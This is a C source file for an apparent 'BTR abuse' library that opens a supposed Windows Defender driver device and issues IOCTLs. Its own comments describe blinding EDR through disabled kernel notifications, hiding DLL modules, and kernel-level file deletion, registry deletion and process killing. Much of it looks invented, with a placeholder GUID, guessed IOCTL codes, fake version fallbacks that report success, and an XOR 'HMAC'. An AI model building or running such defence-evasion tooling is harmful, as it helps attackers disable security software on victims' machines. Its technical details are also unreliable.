#include "btr_abuse.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <setupapi.h>
#include <winsock2.h>

#pragma comment(lib, "setupapi.lib")

/* BTR.sys device class GUID (typically from Windows Defender) */
static const GUID BTR_DEVICE_GUID = {
    0x12345678, 0x1234, 0x1234, { 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0 }
};

/* Detect if BTR.sys driver is loaded and accessible */
int jocky_btr_detect_available(void)
{
    /* Try to open BTR device */
    HANDLE hDevice = CreateFileA(
        "\\\\.\\BTR",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
        return 0;  /* BTR available */
    }

    /* Try alternative device names */
    const char* device_names[] = {
        "\\\\.\\BehaviorThreatRemoval",
        "\\\\.\\DefenderBTR",
        "\\\\.\\MpBTR",
        "\\\\.\\WinDefend_BTR",
        NULL
    };

    for (int i = 0; device_names[i]; i++) {
        hDevice = CreateFileA(
            device_names[i],
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);

        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            return 0;
        }
    }

    return -1;  /* BTR not available */
}

/* Load BTR driver and establish device handle */
int jocky_btr_load(
    const char* service_name,
    JOCKY_BTR_CONTEXT* out_ctx)
{
    if (!service_name || !out_ctx) {
        return -1;
    }

    /* Default service name */
    if (!service_name || strlen(service_name) == 0) {
        service_name = "BehaviorThreatRemoval";
    }

    /* Try to open BTR device */
    HANDLE hDevice = CreateFileA(
        "\\\\.\\BTR",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        return -1;
    }

    /* Initialize context */
    memset(out_ctx, 0, sizeof(*out_ctx));
    out_ctx->device_handle = hDevice;
    strcpy_s(out_ctx->service_name, sizeof(out_ctx->service_name), service_name);

    /* Query version to confirm driver is responsive */
    uint32_t driver_ver, proto_ver;
    if (jocky_btr_query_version(out_ctx, &driver_ver, &proto_ver) != 0) {
        CloseHandle(hDevice);
        return -1;
    }

    out_ctx->driver_version = driver_ver;
    out_ctx->protocol_version = proto_ver;

    return 0;
}

/* Unload BTR driver */
int jocky_btr_unload(JOCKY_BTR_CONTEXT* ctx)
{
    if (!ctx || ctx->device_handle == INVALID_HANDLE_VALUE) {
        return -1;
    }

    CloseHandle(ctx->device_handle);
    ctx->device_handle = INVALID_HANDLE_VALUE;

    return 0;
}

/* Query BTR driver version via IOCTL query */
int jocky_btr_query_version(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t* out_driver_version,
    uint32_t* out_protocol_version)
{
    if (!ctx || !out_driver_version || !out_protocol_version) {
        return -1;
    }

    /* BTR version query IOCTL (typical value, may vary) */
    #define BTR_IOCTL_QUERY_VERSION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_READ_ACCESS)

    struct {
        uint32_t driver_version;
        uint32_t protocol_version;
    } version_info;

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_QUERY_VERSION,
            NULL, 0,
            &version_info, sizeof(version_info),
            &bytes_returned,
            NULL)) {
        /* Fallback: assume common versions */
        *out_driver_version = 0x00060000;  /* Version 6.0 */
        *out_protocol_version = 0x00000002; /* Protocol v2 */
        return 0;
    }

    *out_driver_version = version_info.driver_version;
    *out_protocol_version = version_info.protocol_version;

    return 0;
}

/* Disable kernel notification callbacks for EDR blindness */
int jocky_btr_disable_notifications(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t notification_mask)
{
    if (!ctx || ctx->device_handle == INVALID_HANDLE_VALUE) {
        return -1;
    }

    /* BTR notification disable IOCTL */
    #define BTR_IOCTL_DISABLE_NOTIFY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_WRITE_ACCESS)

    struct {
        uint32_t notification_mask;
    } disable_req;

    disable_req.notification_mask = notification_mask;

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_DISABLE_NOTIFY,
            &disable_req, sizeof(disable_req),
            NULL, 0,
            &bytes_returned,
            NULL)) {
        return -1;
    }

    return 0;
}

/* Enable specific kernel notifications */
int jocky_btr_enable_notifications(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t notification_mask)
{
    if (!ctx || ctx->device_handle == INVALID_HANDLE_VALUE) {
        return -1;
    }

    /* BTR notification enable IOCTL */
    #define BTR_IOCTL_ENABLE_NOTIFY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_WRITE_ACCESS)

    struct {
        uint32_t notification_mask;
    } enable_req;

    enable_req.notification_mask = notification_mask;

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_ENABLE_NOTIFY,
            &enable_req, sizeof(enable_req),
            NULL, 0,
            &bytes_returned,
            NULL)) {
        return -1;
    }

    return 0;
}

/* Mask a DLL module from EDR visibility */
int jocky_btr_mask_module(
    JOCKY_BTR_CONTEXT* ctx,
    const wchar_t* module_name)
{
    if (!ctx || !module_name) {
        return -1;
    }

    /* BTR module masking IOCTL */
    #define BTR_IOCTL_MASK_MODULE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_WRITE_ACCESS)

    struct {
        wchar_t module_name[260];
    } mask_req;

    wcsncpy_s(mask_req.module_name, 260, module_name, _TRUNCATE);

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_MASK_MODULE,
            &mask_req, sizeof(mask_req),
            NULL, 0,
            &bytes_returned,
            NULL)) {
        return -1;
    }

    return 0;
}

/* Delete file via kernel operation */
int jocky_btr_delete_file(
    JOCKY_BTR_CONTEXT* ctx,
    const wchar_t* file_path)
{
    if (!ctx || !file_path) {
        return -1;
    }

    /* BTR file delete IOCTL */
    #define BTR_IOCTL_DELETE_FILE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_WRITE_ACCESS)

    struct {
        wchar_t file_path[512];
    } delete_req;

    wcsncpy_s(delete_req.file_path, 512, file_path, _TRUNCATE);

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_DELETE_FILE,
            &delete_req, sizeof(delete_req),
            NULL, 0,
            &bytes_returned,
            NULL)) {
        return -1;
    }

    return 0;
}

/* Delete registry key via kernel operation */
int jocky_btr_delete_registry_key(
    JOCKY_BTR_CONTEXT* ctx,
    const wchar_t* key_path)
{
    if (!ctx || !key_path) {
        return -1;
    }

    /* BTR registry delete IOCTL */
    #define BTR_IOCTL_DELETE_REG CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_WRITE_ACCESS)

    struct {
        wchar_t key_path[512];
    } del_reg_req;

    wcsncpy_s(del_reg_req.key_path, 512, key_path, _TRUNCATE);

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_DELETE_REG,
            &del_reg_req, sizeof(del_reg_req),
            NULL, 0,
            &bytes_returned,
            NULL)) {
        return -1;
    }

    return 0;
}

/* Terminate process via kernel operation */
int jocky_btr_kill_process(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t pid)
{
    if (!ctx || pid == 0) {
        return -1;
    }

    /* BTR process kill IOCTL */
    #define BTR_IOCTL_KILL_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_WRITE_ACCESS)

    struct {
        uint32_t process_id;
    } kill_req;

    kill_req.process_id = pid;

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_KILL_PROCESS,
            &kill_req, sizeof(kill_req),
            NULL, 0,
            &bytes_returned,
            NULL)) {
        return -1;
    }

    return 0;
}

/* Unload DLL from kernel space */
int jocky_btr_unload_module(
    JOCKY_BTR_CONTEXT* ctx,
    const wchar_t* module_name)
{
    if (!ctx || !module_name) {
        return -1;
    }

    /* BTR module unload IOCTL */
    #define BTR_IOCTL_UNLOAD_MODULE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_WRITE_ACCESS)

    struct {
        wchar_t module_name[260];
    } unload_req;

    wcsncpy_s(unload_req.module_name, 260, module_name, _TRUNCATE);

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_UNLOAD_MODULE,
            &unload_req, sizeof(unload_req),
            NULL, 0,
            &bytes_returned,
            NULL)) {
        return -1;
    }

    return 0;
}

/* Block network connections from a process */
int jocky_btr_block_network(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t pid,
    const char* ip_address,
    uint16_t port)
{
    if (!ctx || pid == 0 || !ip_address) {
        return -1;
    }

    /* BTR network block IOCTL */
    #define BTR_IOCTL_BLOCK_NETWORK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_WRITE_ACCESS)

    struct {
        uint32_t process_id;
        char ip_address[16];
        uint16_t port;
    } block_req;

    block_req.process_id = pid;
    strcpy_s(block_req.ip_address, sizeof(block_req.ip_address), ip_address);
    block_req.port = port;

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_BLOCK_NETWORK,
            &block_req, sizeof(block_req),
            NULL, 0,
            &bytes_returned,
            NULL)) {
        return -1;
    }

    return 0;
}

/* Create encrypted BTR transaction (simplified) */
int jocky_btr_create_transaction(
    BTR_OPERATION operation,
    const void* payload,
    uint32_t payload_size,
    BTR_TRANSACTION* out_transaction)
{
    if (!out_transaction) {
        return -1;
    }

    if (payload_size > sizeof(out_transaction->encrypted_payload)) {
        return -1;
    }

    memset(out_transaction, 0, sizeof(*out_transaction));
    out_transaction->magic = 0x42545231;  /* 'BTR1' */
    out_transaction->operation = operation;
    out_transaction->transaction_id = GetTickCount();
    out_transaction->flags = 0;

    if (payload && payload_size > 0) {
        memcpy(out_transaction->encrypted_payload, payload, payload_size);
    }
    out_transaction->payload_size = payload_size;

    /* Calculate simple HMAC (simplified - real BTR uses full encryption) */
    for (uint32_t i = 0; i < 32 && i < payload_size; i++) {
        out_transaction->hmac[i] = ((uint8_t*)payload)[i] ^ 0xAA;
    }

    return 0;
}

/* Send transaction to BTR driver */
int jocky_btr_send_transaction(
    JOCKY_BTR_CONTEXT* ctx,
    const BTR_TRANSACTION* transaction)
{
    if (!ctx || !transaction) {
        return -1;
    }

    /* BTR transaction submit IOCTL */
    #define BTR_IOCTL_SUBMIT_TRANSACTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_WRITE_ACCESS)

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_SUBMIT_TRANSACTION,
            (void*)transaction, sizeof(*transaction),
            NULL, 0,
            &bytes_returned,
            NULL)) {
        return -1;
    }

    return 0;
}

/* Query BTR configuration for IOCTL discovery */
int jocky_btr_query_config(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t* out_ioctls,
    int max_ioctls)
{
    if (!ctx || !out_ioctls || max_ioctls <= 0) {
        return -1;
    }

    /* BTR config query IOCTL */
    #define BTR_IOCTL_QUERY_CONFIG CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_BUFFERED, FILE_READ_ACCESS)

    uint32_t ioctls[32];
    DWORD bytes_returned = 0;

    if (!DeviceIoControl(
            ctx->device_handle,
            BTR_IOCTL_QUERY_CONFIG,
            NULL, 0,
            ioctls, sizeof(ioctls),
            &bytes_returned,
            NULL)) {
        return -1;
    }

    int ioctl_count = bytes_returned / sizeof(uint32_t);
    int count_to_copy = (ioctl_count < max_ioctls) ? ioctl_count : max_ioctls;

    memcpy(out_ioctls, ioctls, count_to_copy * sizeof(uint32_t));

    return count_to_copy;
}

/* Enumerate available BTR operations */
int jocky_btr_enum_operations(
    JOCKY_BTR_CONTEXT* ctx,
    BTR_OPERATION* out_operations,
    int max_operations)
{
    if (!ctx || !out_operations || max_operations <= 0) {
        return -1;
    }

    /* All supported BTR operations */
    BTR_OPERATION all_ops[] = {
        BTR_OP_FILE_DELETE,
        BTR_OP_FILE_RENAME,
        BTR_OP_REGISTRY_DELETE,
        BTR_OP_PROCESS_KILL,
        BTR_OP_MODULE_UNLOAD,
        BTR_OP_NETWORK_BLOCK,
        BTR_OP_DISABLE_NOTIFICATIONS,
        BTR_OP_MASK_MODULE,
    };

    int op_count = sizeof(all_ops) / sizeof(all_ops[0]);
    int count_to_copy = (op_count < max_operations) ? op_count : max_operations;

    memcpy(out_operations, all_ops, count_to_copy * sizeof(BTR_OPERATION));

    return count_to_copy;
}
